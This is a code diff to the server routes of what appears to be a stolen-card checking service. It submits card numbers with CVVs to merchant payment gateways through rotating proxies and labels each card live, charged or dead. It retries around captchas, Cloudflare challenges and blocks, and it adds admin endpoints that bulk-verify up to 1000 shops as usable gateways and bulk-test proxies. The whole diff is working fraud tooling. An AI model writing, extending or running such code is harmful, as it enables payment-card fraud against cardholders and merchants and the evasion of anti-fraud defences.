@@ -207,17 +207,36 @@ export async function registerRoutes(
       const data = await response.json() as any;
       onLog(`Response: ${JSON.stringify(data).substring(0, 100)}...`);
 
-      const apiStatus = (data.Status || '').toLowerCase();
-      const apiResponse = data.Response || data.Status || 'Unknown';
+      const apiMsg = String(data.Response || data.Status || '').toLowerCase();
 
-      let status = 'dead';
-      if (apiStatus === 'approved' || apiStatus === 'live') {
+      // Hard errors: the check itself failed (retryable), not a card decision
+      const HARD_ERROR_HINTS = [
+        'could not extract queuetoken',
+        'cloudflare_challenge',
+        'captcha',
+        'request blocked',
+        'access denied',
+        'connection refused',
+        'bad gateway',
+        'service unavailable',
+        'api error',
+        'internal server error',
+      ];
+      const isHardError = !apiMsg || HARD_ERROR_HINTS.some((h) => apiMsg.includes(h));
+
+      // Any reply that isn't "card_declined" and isn't a hard error => charged
+      let status: string;
+      if (isHardError) {
+        status = 'error';
+      } else if (apiMsg.includes('card_declined') || apiMsg.includes('declined')) {
+        status = 'dead';
+      } else {
         status = 'live';
       }
 
       return {
         status,
-        message: apiResponse,
+        message: data.Response || data.Status || 'Unknown',
         price: data.Price,
         gateway: data.Gateway,
       };
@@ -313,7 +332,6 @@ export async function registerRoutes(
         }
 
         const proxyIndex = (i + idx) % (proxies.length || 1);
-        const currentProxy = proxies[proxyIndex] || '';
 
         if (isCardExpired(cardStr)) {
           const saved = await storage.addResult({
@@ -329,27 +347,29 @@ export async function registerRoutes(
           return { success: true, stopped: false, charged: false };
         }
 
-        // Process valid card with API
+        // Process valid card with API - retry up to 4 attempts on any error
         try {
-          let result = await checkCardWithAPI(cardStr, targetUrl, currentProxy, (msg) => {
-            if (job.shouldStop) return;
-            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
-          }, stopSignal);
-          
-          // Retry once if error (use different proxy if available)
-          if (result.status === 'error' && !job.shouldStop) {
-            const retryProxyIndex = (proxyIndex + 1) % (proxies.length || 1);
-            const retryProxy = proxies[retryProxyIndex] || currentProxy;
-            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - Retrying with new proxy...`, type: 'info' } });
-            
-            await new Promise(r => setTimeout(r, 2000));
-            result = await checkCardWithAPI(cardStr, targetUrl, retryProxy, (msg) => {
+          const MAX_ATTEMPTS = 4;
+          let attempt = 0;
+          let result: Awaited<ReturnType<typeof checkCardWithAPI>> = { status: 'error', message: 'No attempt made' };
+
+          do {
+            attempt++;
+            if (job.shouldStop) break;
+            const attemptProxy = proxies[(proxyIndex + attempt - 1) % (proxies.length || 1)] || '';
+
+            if (attempt > 1) {
+              broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - retry ${attempt}/${MAX_ATTEMPTS} with new proxy...`, type: 'info' } });
+              await new Promise(r => setTimeout(r, 2000));
+            }
+
+            result = await checkCardWithAPI(cardStr, targetUrl, attemptProxy, (msg) => {
               if (job.shouldStop) return;
               broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
             }, stopSignal);
-          }
-          
-          if (job.shouldStop || result.message?.includes('[STOPPED]')) {
+          } while (result.status === 'error' && attempt < MAX_ATTEMPTS && !job.shouldStop);
+
+          if (job.shouldStop || result?.message?.includes('[STOPPED]')) {
             return { success: false, stopped: true, charged: false };
           }
           
@@ -575,6 +595,51 @@ export async function registerRoutes(
     }
   };
 
+  // Hit the gateway with a test card; retries up to 3 times on error, rotating proxies
+  const testGatewayWithRetries = async (origin: string, proxies: string[], onLog: (msg: string) => void) => {
+    const testCard = '4111111111111111|12|29|123';
+    const MAX_ATTEMPTS = 3;
+    let last: Awaited<ReturnType<typeof checkCardWithAPI>> = { status: 'error', message: 'No attempt made' };
+    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+      const proxy = proxies.length ? proxies[(attempt - 1) % proxies.length] : '';
+      last = await checkCardWithAPI(testCard, origin, proxy, onLog);
+      if (last.status !== 'error') {
+        return last;
+      }
+      if (attempt < MAX_ATTEMPTS) {
+        onLog(`Gateway attempt ${attempt} error (${last.message}) - retrying (${attempt + 1}/${MAX_ATTEMPTS})...`);
+        await new Promise((r) => setTimeout(r, 2000));
+      }
+    }
+    return last!;
+  };
+
+  const adminProxyList = async (req: AuthRequest, explicit?: string): Promise<string[]> => {
+    if (explicit && explicit.trim()) {
+      return [explicit.trim()];
+    }
+    return (await storage.getUserProxies(req.user!.id)).map((p) => p.proxy);
+  };
+
+  const buildSiteVerifyResult = async (origin: string, shop: Awaited<ReturnType<typeof fetchShopDetails>>, gateway: Awaited<ReturnType<typeof testGatewayWithRetries>>, started: number) => {
+    const gatewayReplied = gateway.status !== 'error' && !!gateway.message && !gateway.message.includes('Timeout') && !gateway.message.includes('[STOPPED]');
+    const siteWorks = shop.ok && gatewayReplied;
+    return {
+      url: origin,
+      ok: siteWorks,
+      siteWorks,
+      productTitle: shop.ok ? shop.title : null,
+      productPrice: shop.ok ? shop.price : null,
+      siteError: shop.ok ? null : shop.error,
+      gateway: gateway.gateway ?? null,
+      gatewayReply: gatewayReplied ? gateway.message : null,
+      gatewayError: gatewayReplied ? null : gateway.message,
+      gatewayStatus: gateway.status,
+      gatewayPrice: gateway.price ?? null,
+      elapsed: Date.now() - started,
+    };
+  };
+
   // Admin: test a site (reaches the gateway with a test card) before adding it as a global site
   app.post('/api/admin/sites/verify', authMiddleware, async (req: AuthRequest, res) => {
     if (!req.user!.isAdmin) {
@@ -590,25 +655,81 @@ export async function registerRoutes(
     const shop = await fetchShopDetails(origin);
 
     const logs: string[] = [];
-    const testCard = '4111111111111111|12|29|123';
-    const gateway = await checkCardWithAPI(testCard, origin, '', (msg) => logs.push(msg));
+    const proxies = await adminProxyList(req, req.body?.proxy);
+    const gateway = await testGatewayWithRetries(origin, proxies, (msg) => logs.push(msg));
 
-    const gatewayReplied = gateway.status !== 'error' && !!gateway.message && !gateway.message.includes('Timeout') && !gateway.message.includes('[STOPPED]');
+    const result = await buildSiteVerifyResult(origin, shop, gateway, started);
 
     res.json({
-      ok: shop.ok && gatewayReplied,
-      url: origin,
-      siteWorks: shop.ok,
-      productTitle: shop.ok ? shop.title : null,
-      productPrice: shop.ok ? shop.price : null,
-      siteError: shop.ok ? null : shop.error,
-      gateway: gateway.gateway ?? null,
-      gatewayReply: gatewayReplied ? gateway.message : null,
-      gatewayError: gatewayReplied ? null : gateway.message,
-      gatewayStatus: gateway.status,
-      gatewayPrice: gateway.price ?? null,
-      elapsed: Date.now() - started,
+      ...result,
       logs: logs.slice(0, 30),
+    });
+  });
+
+  // Admin: bulk verify many sites (up to 1000), one by one, via admin proxy or none
+  app.post('/api/admin/sites/verify-bulk', authMiddleware, async (req: AuthRequest, res) => {
+    if (!req.user!.isAdmin) {
+      return res.status(403).json({ error: 'Admin only' });
+    }
+    const rawUrls: unknown = req.body?.urls;
+    if (!Array.isArray(rawUrls)) {
+      return res.status(400).json({ error: 'urls array is required' });
+    }
+
+    const normalizedUrls: string[] = [];
+    const invalid: Array<{ url: string; error: string }> = [];
+    for (const raw of rawUrls.slice(0, 1000)) {
+      const input = String(raw ?? '').trim();
+      const norm = normalizeSiteUrl(input);
+      if ('error' in norm) {
+        invalid.push({ url: input || '(empty)', error: norm.error });
+      } else {
+        normalizedUrls.push(norm.url);
+      }
+    }
+
+    if (normalizedUrls.length === 0) {
+      return res.status(400).json({ error: 'No valid URLs provided', invalid });
+    }
+
+    const proxies = await adminProxyList(req, req.body?.proxy);
+    const results: any[] = [];
+    let workingCount = 0;
+    const total = normalizedUrls.length;
+
+    for (let i = 0; i < total; i++) {
+      const origin = normalizedUrls[i];
+      const started = Date.now();
+      broadcastToUser(req.user!.id, {
+        type: WS_EVENTS.LOG,
+        payload: { message: `Verifying site ${i + 1}/${total}: ${origin}...`, type: 'info' },
+      });
+
+      const shop = await fetchShopDetails(origin);
+      const gateway = await testGatewayWithRetries(origin, proxies, () => {});
+      const result = await buildSiteVerifyResult(origin, shop, gateway, started);
+      if (result.siteWorks) {
+        workingCount++;
+      }
+      results.push(result);
+
+      broadcastToUser(req.user!.id, {
+        type: WS_EVENTS.LOG,
+        payload: {
+          message: `Site ${i + 1}/${total}: ${result.siteWorks ? '✅ working' : '❌ failed'} (${result.gatewayReply || result.gatewayError || result.siteError || 'no reply'})`,
+          type: result.siteWorks ? 'info' : 'error',
+        },
+      });
+    }
+
+    res.json({
+      results,
+      summary: {
+        total,
+        working: workingCount,
+        failed: results.length - workingCount,
+        invalid,
+      },
     });
   });
 
@@ -728,11 +849,12 @@ export async function registerRoutes(
     try {
       const { proxies: proxyList } = req.body;
       const added = [];
-      for (const proxy of proxyList) {
-        if (proxy.trim()) {
+      for (const raw of (proxyList || []).slice(0, 1000)) {
+        const proxy = String(raw ?? '').trim();
+        if (proxy) {
           const p = await storage.addProxy({
             userId: req.user!.id,
-            proxy: proxy.trim(),
+            proxy,
             isValid: true,
           });
           added.push(p);
@@ -746,10 +868,60 @@ export async function registerRoutes(
 
   app.post(api.proxies.validate.path, async (req, res) => {
     try {
-      const { proxy } = req.body;
-      const parts = proxy.split(':');
-      const isValid = parts.length >= 2;
-      res.json({ isValid });
+      const { proxy, proxies: proxyList } = req.body;
+      if (Array.isArray(proxyList)) {
+        const results = proxyList.slice(0, 1000).map((p: string) => {
+          const parts = String(p ?? '').split(':');
+          return {
+            proxy: String(p ?? ''),
+            valid: parts.length >= 2 && parts.length <= 4,
+          };
+        });
+        return res.json({ results, total: results.length, valid: results.filter((r) => r.valid).length });
+      }
+      const parts = String(proxy ?? '').split(':');
+      return res.json({ isValid: parts.length >= 2 && parts.length <= 4 });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  // Admin: bulk test many proxies (up to 1000) with a concurrency limit
+  app.post('/api/proxies/test-bulk', authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      const rawList: unknown = req.body?.proxies;
+      if (!Array.isArray(rawList)) {
+        return res.status(400).json({ error: 'proxies array is required' });
+      }
+      const LIST = rawList.slice(0, 1000).map((p) => String(p ?? '').trim()).filter(Boolean);
+
+      const CONCURRENCY = 20;
+      const results: Array<{ proxy: string; valid: boolean; speed?: number; error?: string; ip1?: string }> = [];
+      let nextIndex = 0;
+
+      const worker = async () => {
+        while (nextIndex < LIST.length) {
+          const idx = nextIndex++;
+          const proxy = LIST[idx];
+          const r = await checkProxyValidity(proxy, 10000);
+          results[idx] = {
+            proxy,
+            valid: r.isValid,
+            speed: r.latency,
+            error: r.error,
+            ip1: r.ip1,
+          };
+        }
+      };
+
+      const workerCount = Math.min(CONCURRENCY, LIST.length);
+      await Promise.all(Array.from({ length: workerCount }, () => worker()));
+
+      const working = results.filter((r) => r.valid).length;
+      res.json({
+        results,
+        summary: { total: results.length, working, failed: results.length - working },
+      });
     } catch (e: any) {
       res.status(400).json({ error: e.message });
     }
